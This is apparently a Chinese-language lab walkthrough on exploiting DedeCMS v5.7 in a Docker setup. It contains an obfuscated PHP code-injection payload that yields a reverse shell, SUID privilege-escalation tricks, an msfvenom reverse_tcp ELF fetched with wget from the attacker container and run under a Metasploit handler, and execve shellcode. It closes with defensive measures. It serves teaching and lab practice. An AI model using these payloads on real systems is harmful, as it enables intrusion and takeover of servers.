- 如何手工白盒挖掘漏洞
- 如何利用漏洞，如何绕过
- 如何从反弹shell对会话提权，后渗透
- 正向反弹与反向反弹shell的区别
- 如何隐藏痕迹，如何维持shell稳定，如何对抗
- 原理是什么，计算机做了什么


## 搭建目标靶机
靶机整套docker环境，可提供复现玩耍
Docker-compose 搭建运行被攻击环境 4个容器分工不同

```
➜  share git:(master) ✗ pwd
/Users/hua/share
➜  share git:(master) ✗ tree -L 3
.
├── attacker
│   ├── base64_shell.py
│   ├── hack.py
│   ├── shell.py
│   └── shellcode.c
└── target
    ├── conf.d
    │   └── nginx.conf
    ├── docker-compose.yml
    ├── html
    │   ├── 1.html
    │   ├── 1.php
    │   ├── 1.txt
    │   ├── shellcode.c
    │   └── uploads
    ├── nginx.conf
    └── php-mysqli
        └── Dockerfile
```

```
version: '3'
services:
  msfs:
    # 攻击平台-渗透工具部署，保持同一网段方便通信
    image: linuxkonsult/kali-metasploit
    tty: true  # 启动失败是因为缺失了控制终端的配置，这里有两种方式修复； 如果不加，msf将会启动失败
    ports:
      - "1234:1234"
    networks:
      app_net:
        ipv4_address: 10.10.10.10  
    container_name: "compose-msf"
  nginx:
    image: nginx:latest
    ports:
      - "80:80"
    depends_on:
      - "php"
    volumes:
      - "$PWD/conf.d:/etc/nginx/conf.d"
      - "$PWD/html:/usr/share/nginx/html"
    networks:
      - app_net
    container_name: "compose-nginx"
  php:
    build: ./php-mysqli
    image: php:7.2-fpm-mysqli
    ports:
      - "9000:9000"
    volumes:
      - "$PWD/html:/var/www/html"
    networks:
      - app_net
    # depends_on:
    #   - python
    container_name: "compose-php"
  # python:
  #   image: python:3.7-alpine
  mysql:
    image: mysql:5.7
    ports:
      - "3306:3306"
    environment:
      - MYSQL_ROOT_PASSWORD=root
    networks:
      app_net:
        ipv4_address: 10.10.10.11
    container_name: "compose-mysql"
networks:
  app_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.10.0/24
```

- 检查mysql ip，实际就是上述在10.10.0.0/24 的 (255 - 2) 的主机号中静态分配了IPV4 10.10.10.1 ，安装靶机网站（最新版dedecms v5.7源码）
bridge：http://blog.daocloud.io/docker-bridge/

## 代码审计&Fuzz
```
➜  uploads find ./ -type f -name "*.php" | xargs grep -n 'include \$'
/dede/plus/ad_js.php:44

➜  uploads find ./ -type f -name "*.php" | xargs grep -n '#@__myad'
找insert 语句
```

## Payload & Bypass
构造 --> 闭合html标签,否则造成 html 注释消毒，之后构造<?php ?>实现 php 语法注入。 

```
import sys
def gen_shell(string):
    tmp = ""
    for i in string:
        tmp += "chr({}).".format(ord(i))  chr.chr
    return tmp[:-1]

if __name__ == "__main__":
    a = gen_shell(sys.argv[1])
    print(a)
    shell = "--><?php $cmd=system({}); echo $cmd; ?>".format(a)
    print(shell)
```

Shell 中有单引号，需要用 \" 转义掉
然后组成 又引入 单引号， 使用chr绕过，最终载荷如下：
```
➜  attacker git:(master) ✗ python3.6 base64_shell.py
--><?php system(base64_decode(chr(99).chr(72).chr(108).chr(48).chr(97).chr(71).chr(57).chr(117).chr(73).chr(67).chr(49).chr(106).chr(73).chr(67).chr(74).chr(108).chr(101).chr(71).chr(86).chr(106).chr(75).chr(70).chr(119).chr(105).chr(89).chr(86).chr(99).chr(120).chr(100).chr(50).chr(73).chr(122).chr(83).chr(106).chr(66).chr(74).chr(83).chr(69).chr(53).chr(50).chr(87).chr(84).chr(74).chr(48).chr(98).chr(71).chr(82).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(100).chr(50).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(104).chr(79).chr(77).chr(86).chr(108).chr(117).chr(81).chr(110).chr(108).chr(105).chr(77).chr(107).chr(53).chr(115).chr(89).chr(122).chr(78).chr(78).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(99).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(48).chr(74).chr(50).chr(89).chr(51).chr(112).chr(122).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(67).chr(98).chr(50).chr(73).chr(122).chr(84).chr(106).chr(66).chr(81).chr(85).chr(48).chr(108).chr(52).chr(84).chr(85).chr(77).chr(48).chr(101).chr(69).chr(49).chr(68).chr(78).chr(72).chr(104).chr(78).chr(81).chr(122).chr(82).chr(52).chr(84).chr(85).chr(78).chr(74).chr(78).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(50).chr(78).chr(72).chr(79).chr(88).chr(108).chr(107).chr(82).chr(68).chr(65).chr(119).chr(84).chr(107).chr(82).chr(82).chr(77).chr(69).chr(57).chr(53).chr(81).chr(87).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(73).chr(84).chr(84).chr(108).chr(106).chr(77).chr(106).chr(108).chr(113).chr(89).chr(84).chr(74).chr(87).chr(77).chr(69).chr(120).chr(117).chr(84).chr(110).chr(90).chr(90).chr(77).chr(110).chr(82).chr(115).chr(90).chr(69).chr(78).chr(111).chr(101).chr(109).chr(73).chr(121).chr(84).chr(110).chr(74).chr(97).chr(87).chr(70).chr(70).chr(49).chr(85).chr(86).chr(86).chr(97).chr(90).chr(108).chr(78).chr(86).chr(78).chr(85).chr(90).chr(87).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(51).chr(100).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(73).chr(84).chr(110).chr(90).chr(90).chr(77).chr(110).chr(82).chr(115).chr(90).chr(69).chr(77).chr(49).chr(86).chr(70).chr(81).chr(119).chr(84).chr(107).chr(120).chr(89).chr(77).chr(85).chr(53).chr(86).chr(86).chr(87).chr(116).chr(87).chr(81).chr(108).chr(82).chr(84).chr(97).chr(122).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(106).chr(101).chr(84).chr(86).chr(113).chr(89).chr(106).chr(73).chr(49).chr(100).chr(86).chr(112).chr(88).chr(84).chr(106).chr(66).chr(76).chr(81).chr(50).chr(104).chr(118).chr(89).chr(106).chr(78).chr(79).chr(77).chr(69).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(120).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(48).chr(70).chr(110).chr(89).chr(48).chr(99).chr(53).chr(101).chr(87).chr(82).chr(68).chr(97).chr(51).chr(66).chr(80).chr(101).chr(85).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(82).chr(122).chr(108).chr(54).chr(84).chr(71).chr(49).chr(83).chr(77).chr(87).chr(78).chr(69).chr(83).chr(87).chr(57).chr(106).chr(101).chr(84).chr(86).chr(116).chr(89).chr(86).chr(100).chr(52).chr(98).chr(71).chr(74).chr(116).chr(79).chr(71).chr(57).chr(76).chr(85).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(51).chr(100).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(69).chr(81).chr(88).chr(66).chr(80).chr(101).chr(85).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(82).chr(122).chr(108).chr(54).chr(84).chr(71).chr(49).chr(83).chr(77).chr(87).chr(78).chr(69).chr(83).chr(87).chr(57).chr(106).chr(101).chr(84).chr(86).chr(116).chr(89).chr(86).chr(100).chr(52).chr(98).chr(71).chr(74).chr(116).chr(79).chr(71).chr(57).chr(76).chr(85).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(51).chr(100).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(69).chr(82).chr(88).chr(66).chr(80).chr(101).chr(85).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(82).chr(122).chr(108).chr(54).chr(84).chr(71).chr(49).chr(83).chr(77).chr(87).chr(78).chr(69).chr(83).chr(87).chr(57).chr(106).chr(101).chr(84).chr(86).chr(116).chr(89).chr(86).chr(100).chr(52).chr(98).chr(71).chr(74).chr(116).chr(79).chr(71).chr(57).chr(76).chr(85).chr(48).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(81).chr(51).chr(100).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(69).chr(83).chr(88).chr(66).chr(80).chr(101).chr(85).chr(70).chr(110).chr(83).chr(85).chr(78).chr(66).chr(90).chr(48).chr(108).chr(68).chr(81).chr(87).chr(100).chr(74).chr(83).chr(69).chr(69).chr(53).chr(89).chr(122).chr(78).chr(87).chr(97).chr(87).chr(78).chr(73).chr(83).chr(110).chr(90).chr(90).chr(77).chr(108).chr(90).chr(54).chr(89).chr(51).chr(107).chr(49).chr(97).chr(108).chr(108).chr(88).chr(101).chr(72).chr(78).chr(76).chr(81).chr(48).chr(108).chr(50).chr(87).chr(87).chr(49).chr(115).chr(100).chr(85).chr(119).chr(121).chr(83).chr(109).chr(104).chr(106).chr(77).chr(109).chr(100).chr(112).chr(83).chr(49).chr(69).chr(57).chr(80).chr(86).chr(119).chr(105).chr(76).chr(109).chr(82).chr(108).chr(89).chr(50).chr(57).chr(107).chr(90).chr(83).chr(104).chr(99).chr(73).chr(109).chr(74).chr(104).chr(99).chr(50).chr(85).chr(50).chr(78).chr(70).chr(119).chr(105).chr(75).chr(83).chr(107).chr(105))); ?>
```

访问
http://127.0.0.1/uploads/plus/ad_js.php?nocache=1&aid=12
触发shell反弹

后⾯的提权， 扫内⽹， 横向， 钓⻥等后渗透⼿段可以在 此基础上展开。

## 提权
上述获得的交互式shell可知是一个低权限的会话

a. 利用Linux内核漏洞提权

b. 利用低权限用户目录下可被Root权限用户调用的脚本提权
   find / -perm -u=s -type f 2>/dev/null
   ex: nmap有SUID位，所以通过"!sh"我们会获取到一个root权限的shell

c. 利用环境变量劫持高权限程序提权

d. elf
msf exploit(handler) > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=5555 -f elf > /tmp/shell.elf

// 另起shell 作为meterpreter会话
// 在tmp目录下启动下载服务
cd /tmp
python -m SimpleHTTPServer 9999

// 在shell1 执行下载 shell.elf 下载到 fpm 容器的 tmp ⽬录下
wget -P /tmp 10.10.10.10:9999/shell.elf
cd /tmp
ls 

>> use exploit/multi/handler 
>> set PAYLOAD linux/x86/meterpreter/reverse_tcp 
>> set LHOST 10.10.10.10
>> set LPORT 5555 
>> exploit

## 原理 & ShellCode
芯片字、位的拓展与关系， cpu与数据通路
计算机指令，字节编码，流水线
寄存器，pc寄存器, eip栈指针
汇编&机器码
大端小端存储与二进制
段页存储校验 segment fault
系统调用
寻址方式

### CISC x86汇编 示例
⾸先来看⼀下shellcode， 他是⼗六进制机器码， 是由汇编指令 “翻译”⽽成的 表示的执⾏ execve("/bin//sh/",["/bin//sh"],NULL) 
我们先来看⼀段简单的本地shellcode
⽤⼀个异或操作来把EAX寄存器清空 （为了避免mov赋值带来的00） 
>> xor %eax,%eax 
>> push %eax (接着将4字节的NULL压栈) 将/bin/sh压栈，保持对⻬，第⼀个参数
>> push $0x68732f2f 
>> push $0x6e69622f 将/bin/sh存放到EBX寄存器，第2个参数 
>> mov %esp,%ebx 压4字节的NULL，第3个参数, 环境变量为NULL 
>> push %eax 将EBX压栈 
>> push %ebx 把EBX地址存⼊ECX寄存器 
>> mov %esp,%ecx 将execve系统调⽤号11(0xb)压⼊AL寄存器，消00 
>> movb $0xb,%al 调⽤int指令进⼊中断 >> int $0x80 保存为 shell.s 

>> as -o shell.o shell.s 
>> ld -o shell sheel.o 
>> objdump -d ./shell 可以提取出⼗六进制码， 如图中的 *shellcode


### RISC ARM 
总结
语言的机制
开发设计的缺陷
运维的失误
如何减少漏洞？
企业级 HIDS 建设， WAF， 漏洞运营处置&闭环， 蓝军，渗透测试， 资产、权限收敛，网络隔离，访问控制，数据加密...